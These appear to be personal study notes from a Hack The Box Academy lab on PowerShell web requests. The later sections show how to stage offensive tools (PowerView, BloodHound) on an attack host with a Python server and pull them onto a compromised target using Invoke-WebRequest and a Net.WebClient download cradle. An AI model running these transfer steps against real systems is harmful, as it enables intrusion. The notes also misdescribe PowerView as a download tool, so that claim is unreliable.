# Web Interaction with PowerShell

#Windows #PowerShell Command Line ( #CLI) can be used to interact with internet resources in the same way that #Linux uses #cURL and #wget  to parse information. We are able to perform #HTTP and #HTTPS requests, submit #GET and #POST requests, parse #HTML data, download resources, authenticate, and establish a session with a website.

### Invoke-WebRequest

The Invoke-WebRequest #cmdlet is used in the same was as curl, wget, and #iwr - and in fact can be used as aliases for the cmdlet. Anyone that is familiar with Linux methods of web interaction will find this material familiar.

#### WebRequest Help

The Invoke-WebRequest cmdlet is powerful and can be complicated - it is useful to read through the related help page to understand the syntax and functions of the utility. 

Run the following command to see the help page for Invoke-WebRequest:

>Get-Help Invoke-WebRequest

### Performing Web Requests

A straightforward web request is a Get request - we can use the -Method Get modifier and the Get-Member cmdlet to output an objects methods and properties with the following command:

>Invoke-WebRequest -Uri "\https://web.ics.purdue.edu/\~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member

#### Filtering Output

The output from our last command is a bit overwhelming and dense with information.

We can filter the output to include only data related to images with the following command:

>Invoke-WebRequest -Uri "\https://web.ics.purdue.edu/\~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images

#### Raw Content

The Raw Content output contains more concise information such as names, addresses, and emails.

We can use the following command to filter for raw content:

>Invoke-WebRequest -Uri "\https://web.ics.purdue.edu/\~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent

### Downloading Files

A useful tool called #PowerView can be used to download resources from the internet and locally. A useful and clever method for installing payloads onto a target host is to run a #python server on your client. You have the payloads on your machine, start the python server, ssh into the target, and then curl the files onto the target from our client machine.

Use the following command to install PowerView:

>Invoke-WebRequest -Uri "\https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\\PowerView.ps1"

### Importing Tools to Target Host

We can download the PowerView.ps1 file on our attack host and then run a python server to host the file. We need to first locate the file and move into the directory that contains it. 

#### Starting a Python Server

Once we are in the directory that contains our PowerView.ps1 file, we can then run a python server on our attack host with the following command:

>python3 -m http.server 8000

#### Downloading to Target Host

Once our server is initialized on our attack host, we can then move to download the files onto the target host. We will need to SSH into our target and then execute some commands to download the tools.

We will use the Invoke-WebRequest cmdlet to connect to the server we are running and download the file onto the target with the following command:

>Invoke-WebRequest -Uri "\http://10.10.10.10:8000/PowerView.ps1" -OutFile "C:\\PowerView.ps1"

### When Invoke-WebRequest is Blocked

Sometimes the Invoke-WebRequest cmdlet will be unavailable to us. In this case we will need to use other Windows methods to retrieve resources from a web client. We can use the Windows class .Net.WebClient as a .Net call that uses system.net methods for retrieving resources. 

Here is an example command of how you might use this .Net call to download a file onto a target host:

>(New-Object Net.WebClient).DownloadFile("\https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")

This command is composed of several parts:

- Download Cradle: (New-Object Net.WebClient).DownloadFile() - this executes our request.
- File #URI: "\https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip"
- File name for the download: "Bloodhound.zip"

Once you perform this command, check the directory to see if the resource Bloodhound.zip exists on your target. You can now extract the tools and execute them. This is considered the 'noisy' part of the process because these activities will be logged by the target. 

### Related:

- [Hack The Box Academy](https://academy.hackthebox.com/ 'hack the box academy home page')
- [HTB Academy PowerShell Web Interaction](https://academy.hackthebox.com/module/167/section/1627 'HTB academy PowerShell web interaction guide')
- [012 Windows Command Line Tools](012%20Windows%20Command%20Line%20Tools.md)
- [012 Windows Network Command Line](012%20Windows%20Network%20Command%20Line.md)
- [013 Additional Windows Tools](013%20Additional%20Windows%20Tools.md)
- [015 Windows Settings](015%20Windows%20Settings.md)
- [031 Troubleshooting Windows](031%20Troubleshooting%20Windows.md)
- [1604 HTB Command Prompt and PowerShell](1604%20HTB%20Command%20Prompt%20and%20PowerShell.md)]